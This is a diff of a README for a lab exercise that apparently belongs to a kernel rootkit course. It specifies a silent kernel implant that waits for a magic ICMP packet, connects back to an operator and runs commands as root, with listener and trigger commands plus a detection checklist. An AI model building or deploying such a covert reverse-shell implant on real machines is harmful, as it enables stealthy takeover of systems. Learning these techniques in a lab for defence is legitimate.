@@ -1,73 +1,93 @@
-# Capstone 4: Remote shell
+# Capstone 4: Implant
 
-Build a module that connects to a remote listener and executes commands.
-You are playing operator.
+Build a module that waits for a magic ICMP packet, then connects
+back to the operator and executes commands. The Reptile pattern:
+silent until triggered, one ping spawns a shell.
 
 ```
-  host machine (listener)                    guest VM (implant)
-  +---------------------------+              +---------------------------+
-  |  $ nc -l -p 4444          |              |  insmod hello.ko          |
-  |                           |              |     |                     |
-  |  listening on :4444       |              |     v                     |
-  |         |                 |  TCP connect |  kthread: beacon_loop     |
-  |         |<----------------|<-------------|     |                     |
-  |         |                 |              |     v                     |
-  |  > id   |                 |  send "id\n" |  recv command             |
-  |         |-----------------|------------->|     |                     |
-  |         |                 |              |     v                     |
-  |         |                 | send output  |  call_usermodehelper()    |
-  |  uid=0  |<----------------|<-------------|     |                     |
-  |         |                 |              |     v                     |
-  |  > uname -a              |              |  send result back         |
-  |         |---------------->|              |     |                     |
-  |  Linux 7.x ...           |              |     v                     |
-  |         |<----------------|              |  sleep(beacon_interval)   |
-  |         |                 |              |     |                     |
-  |  > exit |                 |              |     v                     |
-  |         |                 |  close       |  reconnect loop           |
-  +---------------------------+              +---------------------------+
+  host (operator)                        guest VM (implant)
+  +---------------------------+          +---------------------------+
+  |                           |          |  insmod hello.ko          |
+  |  1. start listener        |          |     |                     |
+  |  $ nc -l -p 4444          |          |     v                     |
+  |                           |          |  netfilter hook (silent)  |
+  |  2. send magic ICMP       |          |     |                     |
+  |  $ ./icmp_send            |  ICMP    |     v                     |
+  |    192.168.1.2             |--------->|  magic packet detected   |
+  |    192.168.1.1 4444        |          |     |                     |
+  |                           |          |     v                     |
+  |  3. shell connects back   |  TCP     |  kthread: connect back   |
+  |                           |<---------|     |                     |
+  |  $ id                     |          |     v                     |
+  |  uid=0(root)              |          |  recv cmd, exec, send    |
+  |  $ uname -r               |          |  result via socket       |
+  |  6.12.0                   |          |                          |
+  |  $ exit                   |          |  close, wait for next    |
+  +---------------------------+          +---------------------------+
 
-  beacon timing:
-       connect     check-in      check-in      disconnect
-  ---|----------|-----------|-----------|---------|----> time
-      0s         5s          10s         15s
+  timeline:
+  insmod    (silence)    ICMP ping    TCP connect    commands    exit
+  ---|---------|-----------|------------|------------|---------|---->
+                           trigger      shell         exec
 ```
 
 ## Prerequisites
 
-Lings 00 through 49 (foundation through networking).
+Lings 00 through 51 (foundation through networking).
 
 ## What you are building
 
-A kernel-space C2 agent. The module runs a background thread that
-connects to a remote listener, receives commands, executes them, and
-sends results back.
+A kernel-space C2 agent, the Reptile pattern. The module sits silent
+until a magic ICMP echo request arrives. The packet payload contains
+the operator's IP and port. The module spawns a kthread that connects
+back via a kernel TCP socket, receives commands, executes them with
+`call_usermodehelper`, and sends results back.
 
-- A kthread runs the beacon loop.
-- It connects to a configurable IP:port via a kernel TCP socket.
-- It reads a command (newline-delimited), executes it with
-  `call_usermodehelper`, captures output, and sends it back.
-- On disconnect, it waits and reconnects.
-- Beacon interval and target are set via module parameters.
+- A netfilter hook inspects incoming ICMP packets (ling 45).
+- A magic marker in the payload triggers activation.
+- A kthread creates a TCP socket and connects to the operator (ling 48).
+- Commands arrive newline-delimited, executed with `call_usermodehelper` (ling 16).
+- Output is captured and sent back over the socket.
+- On disconnect, the thread exits and waits for the next trigger.
+- `/proc/rk_implant` shows connection state (for debugging, hidden in the real thing).
+
+## The magic packet
+
+The ICMP trigger carries the callback address in the payload:
+
+```
+  ICMP echo request
+  +------------------+------------------+
+  | marker (8 bytes) | IP:PORT (string) |
+  | "ROOTKIT\x00"    | "10.0.2.2:4444"  |
+  +------------------+------------------+
+```
+
+Use the provided `tools/icmp_send` to craft the packet:
+
+```sh
+# from the host:
+./tools/icmp_send <vm-ip> <callback-ip> <callback-port>
+```
 
 ## What "done" looks like
 
-Terminal 1 (start a listener with netcat):
+Terminal 1 (host, start listener):
 ```sh
 nc -l -p 4444
 ```
 
-Terminal 2 (VM):
+Terminal 2 (host, send trigger):
 ```sh
-insmod hello.ko target=127.0.0.1 port=4444 interval=1
+./tools/icmp_send 192.168.1.2 192.168.1.1 4444
 ```
 
-Terminal 1:
+Terminal 1 (shell connects back):
 ```
 id
 uid=0(root) gid=0(root)
 uname -r
-7.2.5-4-omarchy
+6.12.0
 exit
 ```
 
@@ -80,12 +100,8 @@ lsmod                                        hello is listed
 ps aux | grep hello                          kthread visible
 ss -tlnp                                     TCP connection exposed
 cat /proc/net/tcp                            socket in raw table
-tcpdump -i eth0                              traffic in plaintext
+tcpdump -i eth0                              trigger packet in cleartext
 ```
-
-Cross-view: compare `ss` output against `/proc/net/tcp`. A rootkit that
-hooks `tcp4_seq_show` to hide from `/proc/net/tcp` but forgets netlink
-(used by `ss`) is caught by the mismatch.
 
 The killer move: capture traffic on the HOST side, outside the VM.
 No kernel rootkit can touch packets after they leave the guest NIC.
@@ -94,11 +110,14 @@ No kernel rootkit can touch packets after they leave the guest NIC.
 
 The check script verifies:
 
-- `/proc/rk_shell` exists and shows `target=127.0.0.1` and `port=4444`.
-- The beacon connects to a local listener (`connections` > 0).
-- Commands sent by the listener are executed (`commands` > 0).
-- Output of `id` contains `uid=0` (captured by the listener).
-- `/proc/rk_shell` disappears after unload.
+- Module loads silently (no connections on start).
+- `/proc/rk_implant` exists and shows `status: waiting`.
+- After sending the magic ICMP packet, a TCP connection is established.
+- Commands sent by the listener are executed.
+- Output of `id` contains `uid=0`.
+- Output of `uname -r` matches the running kernel.
+- After disconnect, module returns to waiting state.
+- `/proc/rk_implant` disappears after unload.
 
 ## Verify
 
@@ -108,3 +127,4 @@ The check script verifies:
 
 ## Hints
 
+Only if stuck. Try without them first.
